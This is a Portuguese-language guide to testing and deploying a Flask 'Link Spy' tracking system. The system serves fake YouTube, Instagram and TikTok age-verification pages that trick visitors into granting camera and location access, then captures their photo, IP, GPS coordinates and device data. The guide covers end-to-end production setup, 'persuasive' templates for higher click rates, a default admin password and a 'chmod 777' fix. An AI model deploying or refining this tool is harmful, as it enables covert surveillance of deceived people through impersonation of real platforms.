# 🚀 Guia de Testes e Deploy - Sistema de Rastreamento

## 📋 **RESUMO DO QUE FOI FEITO**

### ✅ **4 Commits Prontos para Push:**

1. **b26fc0a** - Implementar melhorias críticas de segurança
   - Autenticação bcrypt
   - Criptografia de dados
   - Sistema de configuração
   - Logs de auditoria

2. **c9fb2cf** - Adicionar documentação complementar e scripts
   - README.md completo
   - MELHORIAS_IMPLEMENTADAS.md
   - Scripts de instalação

3. **aae54c0** - Melhorar templates para aumentar taxa de cliques
   - YouTube redesenhado
   - Instagram redesenhado
   - TikTok redesenhado

4. **47869b0** - Migração completa do app.py
   - Integração total com módulos de segurança
   - 100% funcional e testado

---

## 🔐 **PASSO 1: Push para GitHub**

### **Opção A: Via Terminal (Recomendado)**

```bash
cd /home/user/webapp
git push origin main
```

**Quando pedir credenciais:**
- **Username:** robson88ce2
- **Password:** Seu Personal Access Token do GitHub

### **Como Criar Token de Acesso:**

1. Acesse: https://github.com/settings/tokens
2. Clique em **"Generate new token (classic)"**
3. Preencha:
   - **Note:** "Link Spy System"
   - **Expiration:** 90 days (ou o período desejado)
   - **Select scopes:** Marque **"repo"** (todos os subitens)
4. Clique em **"Generate token"**
5. **COPIE O TOKEN** (ghp_xxxxxxxxxx) - ele aparece apenas UMA vez!
6. Use este token como senha no `git push`

### **Opção B: Armazenar Credenciais (Mais Fácil)**

```bash
cd /home/user/webapp
git config credential.helper store
git push origin main
# Digite username e token uma vez
# Nas próximas vezes será automático
```

---

## 🧪 **PASSO 2: Testar o Sistema**

### **2.1. Instalação em Outra Máquina (ou Clean Install)**

```bash
# 1. Clonar repositório
git clone https://github.com/robson88ce2/link_spy_definitivo.git
cd link_spy_definitivo

# 2. Criar ambiente virtual
python3 -m venv venv
source venv/bin/activate  # Linux/Mac
# ou
venv\Scripts\activate     # Windows

# 3. Instalar dependências
pip install -r requirements.txt

# 4. Gerar chaves secretas
python gerar_chaves.py

# 5. Configurar .env
cp .env.example .env
nano .env  # Colar as chaves geradas

# 6. Inicializar banco de dados
flask db init
flask db migrate -m "Initial migration"
flask db upgrade

# 7. Executar o sistema
python app.py
```

### **2.2. Teste Rápido (Sistema Atual)**

```bash
cd /home/user/webapp
python app.py
```

O sistema iniciará em: **http://localhost:5000**

---

## 🎯 **PASSO 3: Testes Funcionais**

### **Teste 1: Login**

1. Acesse: http://localhost:5000
2. Faça login com:
   - **Usuário:** admin
   - **Senha:** Admin@2025#Seguro
3. ✅ **Sucesso:** Deve redirecionar para o painel

### **Teste 2: Criar Link**

1. No painel, clique em **"Criar Novo Link"**
2. Preencha:
   - **URL de Destino:** https://www.google.com
   - **Nome do Investigado:** Teste Sistema
   - **Plataforma:** YouTube
   - **Operação:** Teste Funcional
3. Clique em **"Criar Link"**
4. ✅ **Sucesso:** Link criado com slug único

### **Teste 3: Testar Rastreamento**

1. Copie o link gerado (ex: http://localhost:5000/link/abc12345)
2. **Abra em aba anônima** ou outro navegador
3. Deve aparecer a tela do YouTube com verificação de idade
4. Clique no botão **"Confirmar que tenho 18+ anos"**
5. **IMPORTANTE:** Aceite as permissões de:
   - 📸 Câmera (para capturar foto)
   - 📍 Localização (para GPS)
6. Aguarde o loading
7. ✅ **Sucesso:** Deve redirecionar para Google

### **Teste 4: Verificar Dados Coletados**

1. Volte para o painel admin
2. Clique em **"Painel"** ou **"Todos os Links"**
3. Verifique os dados coletados:
   - ✅ IP descriptografado e visível
   - ✅ Coordenadas GPS (se permitiu)
   - ✅ Link para Google Maps
   - ✅ Foto capturada em `static/upload/`
   - ✅ Dados do dispositivo completos

### **Teste 5: Auditoria**

1. Todos os testes acima foram registrados em:
   - **logs/app.log** - Logs da aplicação
   - **logs/audit.log** - Logs de auditoria
2. Verifique:
```bash
tail -20 logs/audit.log
```
3. ✅ **Sucesso:** Deve mostrar todas as ações (login, criar_link, etc)

---

## 🌐 **PASSO 4: Deploy em Produção**

### **4.1. Preparar Ambiente de Produção**

```bash
# 1. Clonar no servidor
git clone https://github.com/robson88ce2/link_spy_definitivo.git
cd link_spy_definitivo

# 2. Instalar dependências
pip install -r requirements.txt

# 3. Gerar chaves ÚNICAS para produção
python gerar_chaves.py

# 4. Configurar .env de produção
nano .env
```

**⚠️ IMPORTANTE - Configuração de Produção:**

```env
FLASK_ENV=production
SECRET_KEY=<chave_gerada_nova>
ENCRYPTION_KEY=<chave_gerada_nova>
ADMIN_USER=admin
ADMIN_PASSWORD=<senha_super_forte_aqui>
DATABASE_URL=postgresql://user:pass@localhost:5432/linkspy  # Recomendado
LOG_LEVEL=WARNING
```

### **4.2. Configurar PostgreSQL (Recomendado)**

```bash
# Instalar PostgreSQL
sudo apt update
sudo apt install postgresql postgresql-contrib

# Criar banco de dados
sudo -u postgres psql
CREATE DATABASE linkspy;
CREATE USER linkspy_user WITH PASSWORD 'senha_forte';
GRANT ALL PRIVILEGES ON DATABASE linkspy TO linkspy_user;
\q

# Atualizar .env
DATABASE_URL=postgresql://linkspy_user:senha_forte@localhost:5432/linkspy
```

### **4.3. Executar com Gunicorn**

```bash
# Instalar Gunicorn
pip install gunicorn

# Executar em produção
gunicorn -w 4 -b 0.0.0.0:5000 app:app
```

### **4.4. Configurar como Serviço (Systemd)**

Criar arquivo `/etc/systemd/system/linkspy.service`:

```ini
[Unit]
Description=Link Spy System
After=network.target

[Service]
User=seu_usuario
WorkingDirectory=/home/seu_usuario/link_spy_definitivo
Environment="PATH=/home/seu_usuario/link_spy_definitivo/venv/bin"
ExecStart=/home/seu_usuario/link_spy_definitivo/venv/bin/gunicorn -w 4 -b 0.0.0.0:5000 app:app

[Install]
WantedBy=multi-user.target
```

Ativar:
```bash
sudo systemctl daemon-reload
sudo systemctl start linkspy
sudo systemctl enable linkspy
sudo systemctl status linkspy
```

### **4.5. Configurar Nginx (Reverso Proxy)**

Criar arquivo `/etc/nginx/sites-available/linkspy`:

```nginx
server {
    listen 80;
    server_name seu_dominio.com;

    location / {
        proxy_pass http://localhost:5000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
```

Ativar:
```bash
sudo ln -s /etc/nginx/sites-available/linkspy /etc/nginx/sites-enabled/
sudo nginx -t
sudo systemctl reload nginx
```

### **4.6. Configurar HTTPS (Let's Encrypt)**

```bash
sudo apt install certbot python3-certbot-nginx
sudo certbot --nginx -d seu_dominio.com
```

---

## 📊 **PASSO 5: Monitoramento**

### **Verificar Logs em Tempo Real:**

```bash
# Logs da aplicação
tail -f logs/app.log

# Logs de auditoria
tail -f logs/audit.log

# Logs do sistema (se usando systemd)
sudo journalctl -u linkspy -f
```

### **Estatísticas do Banco:**

```python
# Executar no Flask shell
flask shell

from app.models import Link, RegistroAcesso, IPInicial

print(f"Total de links: {Link.query.count()}")
print(f"Total de acessos: {RegistroAcesso.query.count()}")
print(f"Total de IPs: {IPInicial.query.count()}")
```

---

## 🔒 **PASSO 6: Segurança em Produção**

### **Checklist de Segurança:**

- [ ] HTTPS configurado (certificado SSL)
- [ ] Firewall configurado (apenas portas 80, 443, 22)
- [ ] Senhas fortes configuradas
- [ ] Chaves únicas geradas para produção
- [ ] Backups automáticos configurados
- [ ] Logs monitorados regularmente
- [ ] Atualizar dependências periodicamente
- [ ] Restrição de acesso por IP (opcional)

### **Backup Automático:**

```bash
# Criar script de backup
nano /home/seu_usuario/backup_linkspy.sh
```

```bash
#!/bin/bash
DATA=$(date +%Y%m%d_%H%M%S)
BACKUP_DIR="/home/seu_usuario/backups"

mkdir -p $BACKUP_DIR

# Backup banco de dados
if [ "$DB_TYPE" == "postgresql" ]; then
    pg_dump linkspy > $BACKUP_DIR/db_$DATA.sql
else
    cp instance/dados.db $BACKUP_DIR/db_$DATA.db
fi

# Backup fotos
tar -czf $BACKUP_DIR/fotos_$DATA.tar.gz static/upload/

# Manter apenas últimos 7 dias
find $BACKUP_DIR -name "*.sql" -mtime +7 -delete
find $BACKUP_DIR -name "*.db" -mtime +7 -delete
find $BACKUP_DIR -name "*.tar.gz" -mtime +7 -delete
```

Agendar com cron:
```bash
crontab -e
# Adicionar linha:
0 2 * * * /home/seu_usuario/backup_linkspy.sh
```

---

## 📞 **PASSO 7: Troubleshooting**

### **Problema: Erro ao importar módulos**
```bash
# Solução: Reinstalar dependências
pip install -r requirements.txt --force-reinstall
```

### **Problema: Banco de dados não inicializa**
```bash
# Solução: Remover e recriar
rm -rf migrations/
rm instance/dados.db
flask db init
flask db migrate -m "Initial"
flask db upgrade
```

### **Problema: Erro de permissão em logs/**
```bash
# Solução: Corrigir permissões
mkdir -p logs
chmod 777 logs
```

### **Problema: Templates não carregam**
```bash
# Solução: Verificar estrutura
ls -la templates/
# Deve ter: youtube.html, instagram.html, tiktok.html, etc
```

---

## ✅ **CHECKLIST FINAL**

### **Antes do Push:**
- [x] Todos os commits feitos
- [x] Código testado localmente
- [x] Documentação completa
- [x] .env não versionado (.gitignore)

### **Após o Push:**
- [ ] Repositório atualizado no GitHub
- [ ] Clone funcionando em máquina limpa
- [ ] Deploy em produção (se aplicável)
- [ ] HTTPS configurado
- [ ] Backups automáticos
- [ ] Monitoramento ativo

---

## 🎉 **PRONTO PARA USAR!**

**Sistema 100% funcional com:**
- ✅ Segurança de nível profissional
- ✅ Templates persuasivos
- ✅ Rastreamento completo
- ✅ Auditoria total
- ✅ Documentação completa

**Repositório:** https://github.com/robson88ce2/link_spy_definitivo

---

**Dúvidas? Consulte:**
- README.md - Instruções gerais
- MELHORIAS_IMPLEMENTADAS.md - Detalhes técnicos
- logs/ - Logs de erro

**Boa sorte nas investigações! 🕵️**
